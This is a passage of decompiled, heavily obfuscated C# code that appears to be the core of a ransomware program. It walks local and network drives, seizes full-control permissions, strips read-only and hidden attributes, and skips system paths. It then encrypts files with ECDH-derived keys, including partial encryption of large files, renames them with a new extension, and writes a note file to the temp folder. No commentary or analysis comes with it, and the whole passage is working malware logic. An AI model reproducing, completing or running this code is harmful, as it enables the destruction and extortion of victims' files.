			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool HMPZoglhvI(string string_0)
	{
		try
		{
			fgVvqjTpqhE CS_0024_003C_003E8__locals0 = new fgVvqjTpqhE();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.EMhfgmNtvaVY = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.EMhfgmNtvaVY);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107386541);
		}
		catch
		{
			return false;
		}
	}

	public static void cPkfysCcaOIXirBU(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] array = null;
			array = (WXjJcHajhkaSgC ? Encoding.ASCII.GetBytes(EvKBdYIakj(getString_0(107386987))) : Encoding.ASCII.GetBytes(EvKBdYIakj(getString_0(107386500))));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void BiVWcARNBVibS()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			QKkRdHWXNelGs(EvKBdYIakj(getString_0(107386994)), EvKBdYIakj(getString_0(107386949)));
			QKkRdHWXNelGs(EvKBdYIakj(getString_0(107386994)), EvKBdYIakj(getString_0(107386819)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string dqQilGAndXln(string mnMqrkRhYyIL, int pKuKRRUSNGDlnv = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(pKuKRRUSNGDlnv);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(mnMqrkRhYyIL, 1, intPtr, ref pKuKRRUSNGDlnv) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string NQBhurDSLvxN(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static byte[] QCahVTqcPhNK(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	public static void UfpnqbeKARXf()
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Create(CngAlgorithm.ECDiffieHellmanP521, null, new CngKeyCreationParameters
		{
			ExportPolicy = CngExportPolicies.AllowPlaintextExport
		}));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		MiJCtYUbAiLcWGEoBU = eCDiffieHellmanCng.Key.Export(CngKeyBlobFormat.EccPrivateBlob);
		BnuxWErzUCfnEIqmIn = eCDiffieHellmanCng.PublicKey.ToByteArray();
	}

	public static byte[] wQSWiHcHbGYcGyy(byte[] byte_0, byte[] byte_1)
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Import(byte_0, CngKeyBlobFormat.EccPrivateBlob));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		return eCDiffieHellmanCng.DeriveKeyMaterial(CngKey.Import(byte_1, CngKeyBlobFormat.EccPublicBlob));
	}

	public static void VActiygTXQaRxCgZR()
	{
		QKkRdHWXNelGs(getString_0(107396227), EvKBdYIakj(getString_0(107386193)));
		string text = EvKBdYIakj(getString_0(107385999));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388657) + text + getString_0(107388657) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396227);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void DFfJXunWWjOBFo(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(AJzDKHoaGNRf, getString_0(107386446) + string_0 + getString_0(107386405) + ex.Message + getString_0(107396488));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string KcMNmzTKVuN()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389226);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386348);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386339))) ? getString_0(107386353) : getString_0(107386362));
				break;
			case 0:
				text = getString_0(107386344);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386311);
				break;
			case 4:
				text = getString_0(107386330);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386280) : getString_0(107386321));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386288) : getString_0(107386293)) : getString_0(107386298)) : getString_0(107386275));
				break;
			case 10:
				text = getString_0(107386251);
				break;
			}
		}
		if (text != getString_0(107389226))
		{
			text = getString_0(107386246) + text;
			if (oSVersion.ServicePack != getString_0(107389226))
			{
				text = text + getString_0(107387475) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string FSVYPpmyFDpXB(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395633);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(EvKBdYIakj(getString_0(107395600)));
				streamWriter.WriteLine(getString_0(107396488));
				streamWriter.WriteLine(EvKBdYIakj(getString_0(107389762)));
				streamWriter.WriteLine(string_0);
				if (ftECRArlHKepq)
				{
					streamWriter.WriteLine(getString_0(107396488));
					streamWriter.WriteLine(EvKBdYIakj(getString_0(107389668)));
					streamWriter.WriteLine(hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !YrjqOIvQHnLHl)
				{
					File.AppendAllText(text, getString_0(107389635) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(AJzDKHoaGNRf, getString_0(107386265) + ex.Message + getString_0(107396488));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void ACRAsVfQtQu(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		rYqqbsikcTpKOT.yTIQgUdfboGIg CS_0024_003C_003E8__locals0 = new rYqqbsikcTpKOT();
		CS_0024_003C_003E8__locals0.wOcAKxBXVrGNs = string_1;
		CS_0024_003C_003E8__locals0.kuJVmjuPDryAODW = string_2;
		CS_0024_003C_003E8__locals0.RchZFkEDjxt = string_3;
		CS_0024_003C_003E8__locals0.fBIbvVyOzGKM = string_4;
		NLiEmQZDarX = Convert.FromBase64String(CS_0024_003C_003E8__locals0.RchZFkEDjxt);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395712))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = dqQilGAndXln(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !ErNGCzDqbgJcNq.Contains(text))
							{
								ErNGCzDqbgJcNq.Add(text);
							}
							else if (!ErNGCzDqbgJcNq.Contains(array[i].Name))
							{
								ErNGCzDqbgJcNq.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!ErNGCzDqbgJcNq.Contains(array[i].Name))
							{
								ErNGCzDqbgJcNq.Add(array[i].Name);
							}
						}
					}
					else if (!ErNGCzDqbgJcNq.Contains(array[i].Name))
					{
						ErNGCzDqbgJcNq.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!ErNGCzDqbgJcNq.Contains(string_0[i]))
				{
					ErNGCzDqbgJcNq.Add(string_0[i]);
				}
			}
		}
		if (ErNGCzDqbgJcNq.Contains(EvKBdYIakj(getString_0(107385664))) && faWRRnNYaT == getString_0(107396968))
		{
			ErNGCzDqbgJcNq.Remove(EvKBdYIakj(getString_0(107385664)));
		}
		Parallel.ForEach(ErNGCzDqbgJcNq, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new rYqqbsikcTpKOT.yTIQgUdfboGIg();
			CS_0024_003C_003E8__locals0.MheqBEirXg = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.jvNaQKZkTq = string_0;
			if (EjCdzBangCjgRE && !KcMNmzTKVuN().Contains(rYqqbsikcTpKOT.getString_0(107386292)) && !KcMNmzTKVuN().Contains(rYqqbsikcTpKOT.getString_0(107411780)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						IUXSYthoJRyA(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.jvNaQKZkTq);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (dWQLbOGxxGUm == rYqqbsikcTpKOT.getString_0(107396980))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rjrkLClQQGAFB(CS_0024_003C_003E8__locals0.jvNaQKZkTq, CS_0024_003C_003E8__locals0.MheqBEirXg.wOcAKxBXVrGNs, CS_0024_003C_003E8__locals0.MheqBEirXg.fBIbvVyOzGKM, CS_0024_003C_003E8__locals0.MheqBEirXg.kuJVmjuPDryAODW, CS_0024_003C_003E8__locals0.MheqBEirXg.RchZFkEDjxt);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rjrkLClQQGAFB(CS_0024_003C_003E8__locals0.jvNaQKZkTq, CS_0024_003C_003E8__locals0.wOcAKxBXVrGNs, CS_0024_003C_003E8__locals0.fBIbvVyOzGKM, CS_0024_003C_003E8__locals0.kuJVmjuPDryAODW, CS_0024_003C_003E8__locals0.RchZFkEDjxt);
			}
		});
	}

	public static void rjrkLClQQGAFB(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389226));
		List<string> list3 = list2;
		if (UHWPXSoPUMg == getString_0(107396466))
		{
			if (hbPuJuPPGYgMOGV == getString_0(107396968) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && HMPZoglhvI(string_0))
			{
				iWkWXgNeHlCki iWkWXgNeHlCki = null;
				try
				{
					iWkWXgNeHlCki = new iWkWXgNeHlCki(string_0.Replace(getString_0(107396890), getString_0(107389226)));
				}
				catch
				{
					list = CpuiKiVeos(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					guEEvfWUmowpr(iWkWXgNeHlCki.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = CpuiKiVeos(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = CpuiKiVeos(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = IIvhOHDAFoiM.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0495;
					}
				}
				if ((fWdwNKveSnXZw == getString_0(107396466) && !item.EndsWith(text)) || mOohEoBvvwIsCph.Contains(item))
				{
					continue;
				}
				if (tFYBgTlzqriJCl == getString_0(107396968))
				{
					try
					{
						if (MXkjmbkMlDW.nnnWjuJHpHvdMj(item))
						{
							MXkjmbkMlDW.APIOoSxtqbbrVSl(item);
						}
					}
					catch
					{
					}
				}
				mOohEoBvvwIsCph.Add(item);
				if (!AVcTEbDnEiIrK.Contains(Path.GetDirectoryName(item)))
				{
					AVcTEbDnEiIrK.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (QhxiUhpytB == getString_0(107396968) && fileStream.Length > Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024 && !list3.Contains(text))
					{
						if (oaMCRFYrdbFfau == getString_0(107396968))
						{
							foreach (string item2 in WOAZqErHQpvAHsj)
							{
								if (item.ToLower().EndsWith(item2) && XvBfbWHuciprZZ == getString_0(107396968))
								{
									if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && XvBfbWHuciprZZ == getString_0(107396466))
								{
									try
									{
										hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = iQHvEzXEixXur.zQnYkaPtyUjj(item, Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024);
						byte[] hggTPAfoWyJLMW = iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						iQHvEzXEixXur.yPLRgFIAPWTIT(item, hggTPAfoWyJLMW);
						if (string_2 != getString_0(107385687))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107385687))
					{
						PncDZZHetVEA(item, item + string_2, NLiEmQZDarX);
					}
					else
					{
						PncDZZHetVEA(item, item + getString_0(107385682), NLiEmQZDarX);
					}
				}
				catch (Exception)
				{
				}
				IL_0495:;
			}
		}
	}

	public static void guEEvfWUmowpr(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		TVOFMeqqDEgV.FXSsqhzMboXGq CS_0024_003C_003E8__locals0 = new TVOFMeqqDEgV();
		CS_0024_003C_003E8__locals0.ZIfnfpwnJXQh = list_0;
		CS_0024_003C_003E8__locals0.DAzuLkugKGvA = string_1;
		CS_0024_003C_003E8__locals0.TtcBirpqXuVooOHN = string_2;
		CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL = string_3;
		CS_0024_003C_003E8__locals0.xoIjmFKEIRmgYHRxN = new List<string> { getString_0(107389226) };
		if (fWdwNKveSnXZw == getString_0(107396466))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.ZIfnfpwnJXQh)
				{
					if (((!item.Contains(TVOFMeqqDEgV.getString_0(107388107)) && !item.Contains(TVOFMeqqDEgV.getString_0(107388050)) && !item.Contains(TVOFMeqqDEgV.getString_0(107388529)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388544)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388499)) && !item.Contains(TVOFMeqqDEgV.getString_0(107388474)) && !item.Contains(TVOFMeqqDEgV.getString_0(107388485)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388440)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388459)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388422)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388381)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388396)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388338)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388317))) || item.Contains(EvKBdYIakj(TVOFMeqqDEgV.getString_0(107388324)))) && !item.Contains(TVOFMeqqDEgV.getString_0(107387739)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387754)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387705)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387720)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387671)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387686)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387637)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387652)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387607)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387618)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387573)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387592)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387543)) && !item.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387558)) && !item.Contains(EvKBdYIakj(TVOFMeqqDEgV.getString_0(107388021))) && !item.Contains(TVOFMeqqDEgV.getString_0(107387996)) && !item.Contains(TVOFMeqqDEgV.getString_0(107388015)) && !item.Contains(TVOFMeqqDEgV.getString_0(107397159)) && !item.Contains(TVOFMeqqDEgV.getString_0(107388002)) && !item.EndsWith(CS_0024_003C_003E8__locals0.DAzuLkugKGvA) && !item.EndsWith(TVOFMeqqDEgV.getString_0(107387977)) && !item.EndsWith(TVOFMeqqDEgV.getString_0(107387972)) && !item.EndsWith(TVOFMeqqDEgV.getString_0(107387935)) && !item.EndsWith(TVOFMeqqDEgV.getString_0(107387930)) && !item.Contains(TVOFMeqqDEgV.getString_0(107387925)) && !item.Contains(dkWBHAPryK) && !item.Contains(AJzDKHoaGNRf) && !item.Contains(THXwmzLnrqe))
					{
						if (CS_0024_003C_003E8__locals0.TtcBirpqXuVooOHN.Length != 0)
						{
							string[] ttcBirpqXuVooOHN2 = CS_0024_003C_003E8__locals0.TtcBirpqXuVooOHN;
							int num2 = 0;
							while (num2 < ttcBirpqXuVooOHN2.Length)
							{
								string value2 = ttcBirpqXuVooOHN2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0ea4;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.DAzuLkugKGvA))
							{
								goto IL_0ea4;
							}
						}
						catch (Exception)
						{
							goto IL_0ea4;
						}
						if (item.EndsWith(string_0) && !mOohEoBvvwIsCph.Contains(item))
						{
							if (tFYBgTlzqriJCl == TVOFMeqqDEgV.getString_0(107396988))
							{
								try
								{
									if (MXkjmbkMlDW.nnnWjuJHpHvdMj(item))
									{
										MXkjmbkMlDW.APIOoSxtqbbrVSl(item);
									}
								}
								catch
								{
								}
							}
							mOohEoBvvwIsCph.Add(item);
							if (!AVcTEbDnEiIrK.Contains(Path.GetDirectoryName(item)))
							{
								AVcTEbDnEiIrK.Add(Path.GetDirectoryName(item));
							}
							DFfJXunWWjOBFo(item);
							try
							{
								new ZEeNAmcCpQxkDS().EKaaTjlENBUCQI(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (DHKhstFrxWX)
										{
											Console.WriteLine(TVOFMeqqDEgV.getString_0(107411743) + item + TVOFMeqqDEgV.getString_0(107411698) + new FileInfo(item).Length + TVOFMeqqDEgV.getString_0(107411677));
											Console.WriteLine(TVOFMeqqDEgV.getString_0(107411668));
										}
									}
									catch
									{
									}
									QKkRdHWXNelGs(EvKBdYIakj(TVOFMeqqDEgV.getString_0(107412107)), TVOFMeqqDEgV.getString_0(107388677) + item + TVOFMeqqDEgV.getString_0(107388677) + EvKBdYIakj(TVOFMeqqDEgV.getString_0(107412050)) + TVOFMeqqDEgV.getString_0(107388677) + Environment.UserName + TVOFMeqqDEgV.getString_0(107388677) + EvKBdYIakj(TVOFMeqqDEgV.getString_0(107412065)));
								}
							}
							catch (Exception ex14)
							{
								if (IxPlnZLdvsZB)
								{
									try
									{
										File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + item + TVOFMeqqDEgV.getString_0(107412040) + ex14.Message + TVOFMeqqDEgV.getString_0(107396508));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_075a;
									}
									goto end_IL_0759;
									end_IL_075a:;
								}
								catch (Exception ex14)
								{
									if (IxPlnZLdvsZB)
									{
										try
										{
											File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + item + TVOFMeqqDEgV.getString_0(107411927) + ex14.Message + TVOFMeqqDEgV.getString_0(107396508));
										}
										catch (Exception)
										{
										}
									}
									YQVkVIVGpFAMQ++;
									goto end_IL_0759;
								}
								byte[] bytes2;
								if (!(QhxiUhpytB == TVOFMeqqDEgV.getString_0(107396988)) || new FileInfo(item).Length <= Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024 || CS_0024_003C_003E8__locals0.xoIjmFKEIRmgYHRxN.Contains(string_0))
								{
									if (ftECRArlHKepq)
									{
										CS_0024_003C_003E8__locals0.DAzuLkugKGvA = ITyFXeyNngsRQ + CS_0024_003C_003E8__locals0.DAzuLkugKGvA;
									}
									bytes2 = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
									if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
									{
										if (!aYdUAapWGSeW)
										{
											if (!YrjqOIvQHnLHl)
											{
												VzUXnxrRrdNjo(item, item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, NLiEmQZDarX);
											}
											else
											{
												VzUXnxrRrdNjo(item, item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL));
											}
										}
										else
										{
											try
											{
												if (!YrjqOIvQHnLHl)
												{
													KaQFQiQUZOvLzjc(item, item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
												}
												else
												{
													KaQFQiQUZOvLzjc(item, item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
												}
											}
											catch (Exception ex14)
											{
												if (IxPlnZLdvsZB)
												{
													try
													{
														File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + item + TVOFMeqqDEgV.getString_0(107385661) + ex14.Message + TVOFMeqqDEgV.getString_0(107396508));
													}
													catch (Exception)
													{
													}
												}
												YQVkVIVGpFAMQ++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0759;
											}
										}
									}
									else if (!aYdUAapWGSeW)
									{
										if (!YrjqOIvQHnLHl)
										{
											VzUXnxrRrdNjo(item, item + TVOFMeqqDEgV.getString_0(107385702), NLiEmQZDarX);
										}
										else
										{
											VzUXnxrRrdNjo(item, item + TVOFMeqqDEgV.getString_0(107385702), Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL));
										}
									}
									else
									{
										try
										{
											if (!YrjqOIvQHnLHl)
											{
												KaQFQiQUZOvLzjc(item, item, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
											}
											else
											{
												KaQFQiQUZOvLzjc(item, item, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
											}
										}
										catch (Exception ex14)
										{
											if (IxPlnZLdvsZB)
											{
												try
												{
													File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + item + TVOFMeqqDEgV.getString_0(107385661) + ex14.Message + TVOFMeqqDEgV.getString_0(107396508));
												}
												catch (Exception)
												{
												}
											}
											YQVkVIVGpFAMQ++;
											goto end_IL_0759;
										}
									}
									if (YrjqOIvQHnLHl)
									{
										if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
										{
											cPkfysCcaOIXirBU(item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, bytes2);
										}
										else
										{
											cPkfysCcaOIXirBU(item, bytes2);
										}
									}
									goto IL_0ea4;
								}
								CS_0024_003C_003E8__locals0 = new TVOFMeqqDEgV.ccrJtSdjBtY();
								CS_0024_003C_003E8__locals0.LrHzfRIVwfYz = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
									{
										if (ftECRArlHKepq)
										{
											CS_0024_003C_003E8__locals0.DAzuLkugKGvA = ITyFXeyNngsRQ + CS_0024_003C_003E8__locals0.DAzuLkugKGvA;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA);
									}
								}
								catch (Exception ex14)
								{
									if (IxPlnZLdvsZB)
									{
										try
										{
											File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + item + TVOFMeqqDEgV.getString_0(107411866) + ex14.Message + TVOFMeqqDEgV.getString_0(107396508));
										}
										catch (Exception)
										{
										}
									}
									YQVkVIVGpFAMQ++;
									goto end_IL_0759;
								}
								CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa = TVOFMeqqDEgV.getString_0(107389246);
								if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
								{
									CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa = item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA;
								}
								else
								{
									CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa = item;
								}
								if (oaMCRFYrdbFfau == TVOFMeqqDEgV.getString_0(107396988))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in WOAZqErHQpvAHsj)
										{
											if (CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.LrHzfRIVwfYz.DAzuLkugKGvA) && XvBfbWHuciprZZ == TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107396991))
											{
												if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa).Length)
												{
													try
													{
														hdkhpYUKtylncPr.xRNINHsHor(TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107389874), TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107389869), TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107389312), CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa.ToLower().EndsWith(item2) && XvBfbWHuciprZZ == TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107396489))
											{
												try
												{
													hdkhpYUKtylncPr.xRNINHsHor(TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107389874), TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107389869), TVOFMeqqDEgV.ccrJtSdjBtY.getString_0(107389312), CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
								if (LhIskusGNtqPC == TVOFMeqqDEgV.getString_0(107396486))
								{
									byte[] array2 = null;
									byte[] byte_2 = iQHvEzXEixXur.zQnYkaPtyUjj(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024);
